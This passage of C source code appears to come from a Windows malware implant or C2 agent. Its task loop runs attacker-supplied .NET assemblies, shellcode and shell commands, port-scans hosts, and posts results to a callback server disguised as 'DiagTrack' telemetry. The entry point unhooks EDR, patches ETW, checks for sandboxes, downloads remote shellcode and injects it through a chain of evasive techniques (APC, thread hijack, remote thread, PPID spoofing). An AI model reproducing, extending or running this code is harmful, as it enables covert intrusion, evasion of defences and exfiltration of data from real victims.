                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            /* Write to temp file */
            WCHAR ea_td[512]={0},ea_tf[512]={0};
            GetTempPathW(480,ea_td);
            GetTempFileNameW(ea_td,L"ea",0,ea_tf);
            /* Give it a .dll extension so dotnet recognises it */
            WCHAR ea_dll[520]={0}; int ea_di=0;
            while(ea_tf[ea_di]&&ea_di<515){ea_dll[ea_di]=ea_tf[ea_di];ea_di++;}
            /* Replace last char with ".dll" */
            if(ea_di>4){ea_di-=4; ea_dll[ea_di]=0;}
            const WCHAR _dll[]={L'.',L'd',L'l',L'l',0};
            for(int _di=0;_dll[_di];_di++) ea_dll[ea_di++]=_dll[_di]; ea_dll[ea_di]=0;
            HANDLE hEaF=CreateFileW(ea_dll,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,NULL);
            if(hEaF==INVALID_HANDLE_VALUE){
                HeapFree(GetProcessHeap(),0,ea_bytes);
                DeleteFileW(ea_tf);
                const char *em="[-] execasm: temp file create failed\r\n"; DWORD el=(DWORD)lt_strlen(em);
                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            DWORD ea_bw=0; WriteFile(hEaF,ea_bytes,(DWORD)ea_sz,&ea_bw,NULL);
            CloseHandle(hEaF); HeapFree(GetProcessHeap(),0,ea_bytes);
            /* Build command: dotnet <path.dll> [args] */
            char ea_cmd[4096]={0}; int ea_ci=0;
            const char *ea_pfx="dotnet ";
            for(int _p=0;ea_pfx[_p];_p++) ea_cmd[ea_ci++]=ea_pfx[_p];
            /* append wide path as narrow */
            for(int _wp=0;ea_dll[_wp]&&ea_ci<3900;_wp++)
                ea_cmd[ea_ci++]=(char)(ea_dll[_wp]&0xFF);
            if(ea_arg[ea_b64_end]==' '){
                ea_cmd[ea_ci++]=' ';
                const char *ea_args=ea_arg+ea_b64_end+1;
                for(int _ap=0;ea_args[_ap]&&ea_ci<4090;_ap++) ea_cmd[ea_ci++]=ea_args[_ap];
            }
            ea_cmd[ea_ci]=0;
            /* Run via POLY_EXECMD — falls back to cmd.exe which finds dotnet in PATH */
            DWORD ea_outlen=0;
            PBYTE ea_out=POLY_EXECMD(ea_cmd,&ea_outlen);
            /* Cleanup temp files */
            DeleteFileW(ea_dll); DeleteFileW(ea_tf);
            if(!ea_out||ea_outlen==0){
                const char *em="[-] execasm: execution failed (dotnet not found?)\r\n";
                DWORD el=(DWORD)lt_strlen(em);
                if(ea_out){HeapFree(GetProcessHeap(),0,ea_out);ea_out=NULL;ea_outlen=0;}
                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            _lt_post_task_result(session_id,task_id,result_base,ea_out,ea_outlen);
            HeapFree(GetProcessHeap(),0,ea_out);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* shellcode <base64> — decode and run raw shellcode in-process */
        } else if(lt_strpfx(command,"shellcode ")&&command[10]){
            const char *sc_b64=command+10;
            DWORD sc_b64_len=(DWORD)lt_strlen(sc_b64);
            DWORD sc_maxlen=(sc_b64_len*3)/4+8;
            PBYTE sc_heap=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sc_maxlen);
            if(!sc_heap){
                const char *em="[-] shellcode: heap alloc failed\r\n";
                DWORD el=(DWORD)lt_strlen(em);
                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            DWORD sc_len=lt_b64dec((const BYTE*)sc_b64,sc_b64_len,sc_heap);
            if(sc_len<4){
                HeapFree(GetProcessHeap(),0,sc_heap);
                const char *em="[-] shellcode: base64 decode failed or too short\r\n";
                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            /* Allocate RW virtual memory for shellcode via indirect syscall */
            PVOID sc_va=NULL; SIZE_T sc_sz=(SIZE_T)sc_len;
            NTSTATUS sst=POLY_NTALLOC(GetCurrentProcess(),&sc_va,0,&sc_sz,
                MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
            if(sst<0||!sc_va){
                HeapFree(GetProcessHeap(),0,sc_heap);
                const char *em="[-] shellcode: VirtualAlloc failed\r\n";
                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo,el);
                if(eo) HeapFree(GetProcessHeap(),0,eo);
                HeapFree(GetProcessHeap(),0,task_raw); continue;
            }
            /* Copy shellcode to virtual memory and make RX */
            POLY_NTWRITE(GetCurrentProcess(),sc_va,sc_heap,(SIZE_T)sc_len,NULL);
            HeapFree(GetProcessHeap(),0,sc_heap);
            ULONG sc_old_prot=0;
            POLY_NTPROT(GetCurrentProcess(),&sc_va,&sc_sz,PAGE_EXECUTE_READ,&sc_old_prot);
            /* Launch shellcode thread via indirect NtCreateThreadEx */
            HANDLE sc_th=NULL;
            POLY_NTTHREAD(&sc_th,THREAD_ALL_ACCESS,NULL,GetCurrentProcess(),
                (PVOID)sc_va,NULL,0,0,0x10000,0x10000,NULL);
            const char *sc_resp=sc_th?"[+] shellcode: running in background thread\r\n"
                                     :"[-] shellcode: thread creation failed\r\n";
            if(sc_th) POLY_NTCLOSE(sc_th);
            DWORD sr_len=(DWORD)lt_strlen(sc_resp);
            PBYTE sr_out=(PBYTE)HeapAlloc(GetProcessHeap(),0,sr_len+2);
            if(sr_out) for(DWORD _i=0;_i<=sr_len;_i++) sr_out[_i]=(BYTE)sc_resp[_i];
            _lt_post_task_result(session_id,task_id,result_base,sr_out,sr_len);
            if(sr_out) HeapFree(GetProcessHeap(),0,sr_out);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        /* portscan <host> [start[-end]] — TCP connect-based port scanner */
        } else if(lt_strpfx(command,"portscan ")&&command[9]){
            const char *ps_arg=command+9;
            char ps_host[128]={0}; int phi=0;
            while(ps_arg[phi]&&ps_arg[phi]!=' '&&phi<127){ps_host[phi]=ps_arg[phi];phi++;}
            DWORD ps_s=1,ps_e=1024;
            if(ps_arg[phi]==' '){
                const char *pr=ps_arg+phi+1; DWORD pa=0; int pi=0;
                while(pr[pi]>='0'&&pr[pi]<='9'){pa=pa*10+(pr[pi++]-'0');}
                ps_s=pa;
                if(pr[pi]=='-'){pi++; DWORD pb=0;
                    while(pr[pi]>='0'&&pr[pi]<='9'){pb=pb*10+(pr[pi++]-'0');}
                    ps_e=pb?pb:pa;
                } else { ps_e=pa; }
            }
            if(ps_s==0) ps_s=1;
            if(ps_e<ps_s) ps_e=ps_s;
            if(ps_e-ps_s>10000) ps_e=ps_s+10000;
            DWORD ps_cap=8192,ps_used=0;
            char *ps_buf=(char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,ps_cap);
            if(!ps_buf){HeapFree(GetProcessHeap(),0,task_raw);continue;}
            /* Load ws2_32 dynamically — same pattern as POLY_HTTPGET */
            typedef int    (WINAPI *pfnWSS2)(WORD,PVOID);
            typedef SOCKET (WINAPI *pfnSK2)(int,int,int);
            typedef int    (WINAPI *pfnCN2)(SOCKET,const struct sockaddr*,int);
            typedef int    (WINAPI *pfnCS2)(SOCKET);
            typedef int    (WINAPI *pfnIO2)(SOCKET,long,u_long*);
            typedef int    (WINAPI *pfnSL2)(int,fd_set*,fd_set*,fd_set*,const struct timeval*);
            typedef u_short(WINAPI *pfnHN2)(u_short);
            typedef int    (WINAPI *pfnGAI2)(const char*,const char*,_LT_AI*,_LT_AI**);
            typedef void   (WINAPI *pfnFAI2)(_LT_AI*);
            HMODULE hWs2=LoadLibraryA("ws2_32.dll");
            if(!hWs2){HeapFree(GetProcessHeap(),0,ps_buf);
                _lt_post_task_result(session_id,task_id,result_base,(PBYTE)"[-] portscan: ws2_32 load failed\r\n",34);
                HeapFree(GetProcessHeap(),0,task_raw); continue;}
            pfnWSS2 fnWSS2=(pfnWSS2)GetProcAddress(hWs2,"WSAStartup");
            pfnSK2  fnSK2 =(pfnSK2) GetProcAddress(hWs2,"socket");
            pfnCN2  fnCN2 =(pfnCN2) GetProcAddress(hWs2,"connect");
            pfnCS2  fnCS2 =(pfnCS2) GetProcAddress(hWs2,"closesocket");
            pfnIO2  fnIO2 =(pfnIO2) GetProcAddress(hWs2,"ioctlsocket");
            pfnSL2  fnSL2 =(pfnSL2) GetProcAddress(hWs2,"select");
            pfnHN2  fnHN2 =(pfnHN2) GetProcAddress(hWs2,"htons");
            pfnGAI2 fnGAI2=(pfnGAI2)GetProcAddress(hWs2,"getaddrinfo");
            pfnFAI2 fnFAI2=(pfnFAI2)GetProcAddress(hWs2,"freeaddrinfo");
            typedef int (WINAPI *pfnWSC2)(void);
            pfnWSC2 fnWSC2=(pfnWSC2)GetProcAddress(hWs2,"WSACleanup");
            if(!fnWSS2||!fnSK2||!fnCN2||!fnCS2||!fnIO2||!fnSL2||!fnHN2||!fnGAI2||!fnFAI2){
                FreeLibrary(hWs2); HeapFree(GetProcessHeap(),0,ps_buf);
                _lt_post_task_result(session_id,task_id,result_base,(PBYTE)"[-] portscan: ws2_32 proc fail\r\n",32);
                HeapFree(GetProcessHeap(),0,task_raw); continue;}
            WSADATA ps_wsd; lt_zero(&ps_wsd,sizeof(ps_wsd));
            fnWSS2(0x0202,&ps_wsd);
            /* Resolve hostname once before scanning ports */
            u_long ps_ip=0xFFFFFFFF;
            { _LT_AI ps_hints; lt_zero(&ps_hints,sizeof(ps_hints));
              ps_hints.ai_family=2; ps_hints.ai_socktype=1; /* AF_INET, SOCK_STREAM */
              _LT_AI *ps_res=NULL;
              if(fnGAI2(ps_host,NULL,&ps_hints,&ps_res)==0&&ps_res){
                  ps_ip=((struct sockaddr_in*)ps_res->ai_addr)->sin_addr.S_un.S_addr;
                  fnFAI2(ps_res);
              }
            }
            if(ps_ip==0xFFFFFFFF){
                const char *em3="[-] portscan: host resolution failed\r\n";
                DWORD el3=(DWORD)lt_strlen(em3);
                if(fnWSC2) fnWSC2(); FreeLibrary(hWs2);
                HeapFree(GetProcessHeap(),0,ps_buf);
                PBYTE eo3=(PBYTE)HeapAlloc(GetProcessHeap(),0,el3+2);
                if(eo3) for(DWORD _i=0;_i<=el3;_i++) eo3[_i]=(BYTE)em3[_i];
                _lt_post_task_result(session_id,task_id,result_base,eo3,el3);
                if(eo3) HeapFree(GetProcessHeap(),0,eo3);
                HeapFree(GetProcessHeap(),0,task_raw); continue;}
            DWORD ps_open=0;
            for(DWORD port=ps_s;port<=ps_e;port++){
                SOCKET sk=fnSK2(2,1,6);
                if(sk==(SOCKET)(~0)) continue;
                u_long nb2=1; fnIO2(sk,(long)0x8004667EUL,&nb2); /* FIONBIO */
                struct sockaddr_in sa2; lt_zero(&sa2,sizeof(sa2));
                sa2.sin_family=2; /* AF_INET */
                sa2.sin_port=fnHN2((u_short)port);
                sa2.sin_addr.S_un.S_addr=ps_ip;
                fnCN2(sk,(struct sockaddr*)&sa2,(int)sizeof(sa2));
                /* select 250ms write-ready = connected */
                fd_set wfds; FD_ZERO(&wfds); FD_SET(sk,&wfds);
                struct timeval tv2={0,250000};
                int sel2=fnSL2(0,NULL,&wfds,NULL,&tv2);
                if(sel2>0){
                    char pln[32]={0}; int pli=0;
                    char ptmp2[8]={0}; DWORD pv2=port; int pti2=0;
                    if(pv2==0){ptmp2[0]='0';pti2=1;}
                    else{char rt2[8]={0};int ri2=0;
                        while(pv2>0){rt2[ri2++]=(char)('0'+(int)(pv2%10));pv2/=10;}
                        for(int _rr=ri2-1;_rr>=0;_rr--) ptmp2[pti2++]=rt2[_rr];}
                    for(int _pp=0;_pp<pti2;_pp++) pln[pli++]=ptmp2[_pp];
                    const char *sfx="/tcp  open\r\n";
                    for(int _ss=0;sfx[_ss];_ss++) pln[pli++]=sfx[_ss];
                    if(ps_used+(DWORD)pli+4>ps_cap){
                        DWORD nc2=ps_cap*2+(DWORD)pli+64;
                        char *nb3=(char*)HeapAlloc(GetProcessHeap(),0,nc2);
                        if(nb3){for(DWORD _ci=0;_ci<ps_used;_ci++) nb3[_ci]=ps_buf[_ci];
                            HeapFree(GetProcessHeap(),0,ps_buf);ps_buf=nb3;ps_cap=nc2;}}
                    for(int _aa=0;_aa<pli;_aa++) ps_buf[ps_used++]=pln[_aa];
                    ps_open++;
                }
                fnCS2(sk);
            }
            if(fnWSC2) fnWSC2(); FreeLibrary(hWs2);
            if(ps_used==0){const char *nem="(no open ports)\r\n";
                for(int _ni=0;nem[_ni];_ni++) ps_buf[ps_used++]=nem[_ni];}
            PBYTE ps_out=(PBYTE)HeapAlloc(GetProcessHeap(),0,ps_used+2);
            if(ps_out) for(DWORD _pi=0;_pi<ps_used;_pi++) ps_out[_pi]=(BYTE)ps_buf[_pi];
            HeapFree(GetProcessHeap(),0,ps_buf);
            _lt_post_task_result(session_id,task_id,result_base,ps_out,ps_used);
            if(ps_out) HeapFree(GetProcessHeap(),0,ps_out);
            HeapFree(GetProcessHeap(),0,task_raw); continue;

        } else {
            /* Task 10: dispatch shell commands to a background thread */
            int slot=_lt_alloc_slot();
            if(slot<0){
                /* All slots busy — fall back to synchronous execution */
                DWORD out_len=0;
                PBYTE output=POLY_EXECMD(command,&out_len);
                DWORD b64_sz=((out_len+2)/3)*4+4;
                char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
                if(b64) lt_b64encode(output?output:(PBYTE)"",output?out_len:0,b64);
                DWORD json_sz=256+(b64?lt_strlen(b64):0);
                char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
                if(rjson){
                    lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
                    lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
                    lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                    if(b64) lt_strcat(rjson,b64);
                    lt_strcat(rjson,"\"}]}");
                    char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
                    lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
                    PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,lt_strlen(rjson),NULL);
                    if(pr) HeapFree(GetProcessHeap(),0,pr);
                    HeapFree(GetProcessHeap(),0,rjson);
                }
                if(b64) HeapFree(GetProcessHeap(),0,b64);
                if(output){lt_zero(output,out_len);HeapFree(GetProcessHeap(),0,output);}
            } else {
                _LT_SLOT *sl=&_lt_slots[slot];
                for(int _ti=0;_ti<16;_ti++) sl->task_id[_ti]=task_id[_ti]; sl->task_id[16]=0;
                DWORD ci=0; while(command[ci]&&ci<4094){sl->cmd[ci]=command[ci];ci++;} sl->cmd[ci]=0;
                sl->output=NULL; sl->out_len=0;
                HANDLE hTh=NULL;
                POLY_NTTHREAD(&hTh,THREAD_ALL_ACCESS,NULL,GetCurrentProcess(),
                    (PVOID)POLY_TASK_THREAD,sl,0,0,0x20000,0x20000,NULL);
                if(hTh) POLY_NTCLOSE(hTh);
                else { InterlockedExchange(&sl->state,0); /* return slot */ }
            }
        }

        HeapFree(GetProcessHeap(),0,task_raw);
    }
}

/*
 * Pipe-captured self-injection + HTTPS exfil.
 * Redirects stdout/stderr to a pipe before running shellcode so donut-loaded
 * .NET assemblies write there, reads the output after the thread completes,
 * then POSTs to the callback URL as telemetry JSON.
 * Falls back to plain POLY_SELFINJECT if pipe creation fails.
 */
static int POLY_CAPTURE(PBYTE sc, SIZE_T sclen, const char *cb_url) {
    SECURITY_ATTRIBUTES sa={sizeof(sa),NULL,TRUE};
    HANDLE hR=NULL,hW=NULL;
    if(!CreatePipe(&hR,&hW,&sa,0)) return POLY_SELFINJECT(sc,sclen);
    SetHandleInformation(hR,HANDLE_FLAG_INHERIT,0);

    HANDLE hOldOut=GetStdHandle(STD_OUTPUT_HANDLE);
    HANDLE hOldErr=GetStdHandle(STD_ERROR_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE,hW);
    SetStdHandle(STD_ERROR_HANDLE,hW);

    int ret=POLY_SELFINJECT(sc,sclen);

    SetStdHandle(STD_OUTPUT_HANDLE,hOldOut);
    SetStdHandle(STD_ERROR_HANDLE,hOldErr);
    CloseHandle(hW);

    PBYTE out=NULL; DWORD total=0; BYTE tmp[4096]; DWORD rd=0;
    while(ReadFile(hR,tmp,sizeof(tmp),&rd,NULL)&&rd>0){
        PBYTE nb=(PBYTE)HeapAlloc(GetProcessHeap(),0,total+rd+2);
        if(!nb) break;
        if(out){for(DWORD k=0;k<total;k++) nb[k]=out[k];HeapFree(GetProcessHeap(),0,out);}
        for(DWORD k=0;k<rd;k++) nb[total+k]=tmp[k];
        total+=rd; out=nb;
    }
    CloseHandle(hR);

    if(cb_url&&cb_url[0]){
        DWORD outsz=(total>0)?total:2;
        PBYTE outbuf=(total>0)?out:(PBYTE)"OK";
        DWORD b64sz=((outsz+2)/3)*4+4;
        char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64sz);
        if(b64){
            lt_b64encode(outbuf,outsz,b64);
            DWORD jsz=256+(DWORD)lt_strlen(b64)+4;
            char *jsbuf=(char*)HeapAlloc(GetProcessHeap(),0,jsz);
            if(jsbuf){
                static const char hx[]="0123456789abcdef";
                char mid[17];
                DWORD tc=(DWORD)GetTickCount64(), pid2=GetCurrentProcessId();
                for(int i2=0;i2<8;i2++){
                    BYTE v=(BYTE)((tc>>(i2*4))^(pid2>>(i2*3)));
                    mid[i2*2]=hx[v>>4]; mid[i2*2+1]=hx[v&0xF];
                }
                mid[16]=0;
                lt_strcpy(jsbuf,"{\"machineId\":\""); lt_strcat(jsbuf,mid);
                lt_strcat(jsbuf,"\",\"sessionId\":\"00000000\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                lt_strcat(jsbuf,b64);
                lt_strcat(jsbuf,"\"}]}");
                PBYTE pr=POLY_HTTPPOST(cb_url,(PBYTE)jsbuf,lt_strlen(jsbuf),NULL);
                if(pr) HeapFree(GetProcessHeap(),0,pr);
                HeapFree(GetProcessHeap(),0,jsbuf);
            }
            HeapFree(GetProcessHeap(),0,b64);
        }
    }
    if(out){lt_zero(out,total);HeapFree(GetProcessHeap(),0,out);}
    return ret;
}

/* ─── Command-line tokenizer ─── */
static int lt_parse_cmdline(char **argv, int max_argc) {
    static char cl[2048]; char *src=GetCommandLineA(); DWORD i=0;
    while(src[i]&&i<2046){cl[i]=src[i];i++;} cl[i]=0;
    char *p=cl; int argc=0;
    while(*p&&argc<max_argc){
        while(*p==' ') p++;
        if(!*p) break;
        if(*p=='"'){p++;argv[argc++]=p;while(*p&&*p!='"')p++;if(*p)*p++=0;}
        else{argv[argc++]=p;while(*p&&*p!=' ')p++;if(*p)*p++=0;}
    }
    argv[argc]=NULL; return argc;
}

/* ─── Entry point ─── */
static int lt_run(int argc, char *argv[]) {
    volatile int _j=POLY_JUNK1(argc)+POLY_JUNK2(1,2)+POLY_JUNK3();
    (void)_j;

    LPCSTR remote_url=NULL, local_path=NULL, cb_url=NULL;
    BOOL force_self=FALSE, agent_mode=FALSE;

    for(int i=1;i<argc;i++){
        if(lt_streq(argv[i],"-remote")==0&&i+1<argc) remote_url=argv[++i];
        else if(lt_streq(argv[i],"-local")==0&&i+1<argc) local_path=argv[++i];
        else if(lt_streq(argv[i],"-cb")==0&&i+1<argc) cb_url=argv[++i];
        else if(lt_streq(argv[i],"-self")==0) force_self=TRUE;
        else if(lt_streq(argv[i],"-agent")==0) agent_mode=TRUE;
    }

    /*
     * No recognised flags found.
     * When run as a standalone PE with explicit -agent, that flag is set above.
     * When donut-injected, GetCommandLineA() returns the HOST process command line
     * (e.g. "powershell.exe ..."), so no flag is ever recognised — default to
     * agent mode so the injected shellcode still registers with C2.
     */
    if(!agent_mode&&!remote_url&&!local_path) agent_mode=TRUE;

    /*
     * Agent mode: C2 polling loop.
     * POLY_INITSTUB is required — POLY_NTDELAY and POLY_NTTHREAD in the poll loop
     * use LT_STUB(i) which computes (POLY_STUBS + i*32).  POLY_STUBS starts NULL,
     * so without INITSTUB every stub call jumps to a near-null address and
     * SEGFAULTs the process immediately after registration.
     *
     * POLY_UNHOOK and POLY_PATCHETW remain optional for agent mode: unhooking is
     * not required for WinHTTP connectivity, and the agent emits no
     * injection-related ETW events.
     */
    if(agent_mode&&!remote_url&&!local_path){
        POLY_INITSTUB();   /* best-effort: if Halo's Gate fails in a hooked process,
                            * POLY_STUBS stays NULL and the first NTDELAY will fault —
                            * acceptable, since the alternative (current crash) is the same */
        POLY_AGENT();
        return 0;
    }
    if(!POLY_INITSTUB()) return 12;
    POLY_UNHOOK();
    POLY_PATCHETW();
    if(POLY_SANDBOX()) return 0;

    /* Load shellcode — remote takes priority; free local result if both provided */
    SIZE_T sclen=0;
    PBYTE sc=NULL;
    if(local_path) sc=POLY_LOADENC(local_path,&sclen);
    if(remote_url){
        if(sc){lt_zero(sc,sclen);HeapFree(GetProcessHeap(),0,sc);sc=NULL;sclen=0;}
        sc=POLY_HTTPGET(remote_url,&sclen);
    }
    if(!sc||sclen==0) return 13;

    if(!force_self){
        /*
         * Task 4 — Injection chain (most-evasive first):
         *   1. Early Bird APC      — no new thread event, shellcode runs from main thread
         *   2. Thread hijack       — RIP patch into existing thread, no new thread at all
         *   3. NtCreateThreadEx    — classic remote thread (fallback)
         *   4. PPID-spoofed spawn  — last resort new-process injection
         */
        if(POLY_INJECT_APC(sc,sclen)) goto done;
        DWORD tpid=POLY_FINDPID(LT_INJ_TARGET);
        if(tpid&&POLY_INJECT_HIJACK(tpid,sc,sclen)) goto done;
        if(tpid&&POLY_INJECT(tpid,sc,sclen)) goto done;
        if(POLY_SPAWNinject(sc,sclen)) goto done;
    }
    if(cb_url&&cb_url[0])
        POLY_CAPTURE(sc,sclen,cb_url);
    else
        POLY_SELFINJECT(sc,sclen);

done:
    lt_zero(sc,sclen);
    HeapFree(GetProcessHeap(),0,sc);
    return 0;
}

void __attribute__((noreturn)) mainCRTStartup(void) {
    char *argv[16]={NULL};
    int argc=lt_parse_cmdline(argv,15);
    ExitProcess((UINT)lt_run(argc,argv));
}
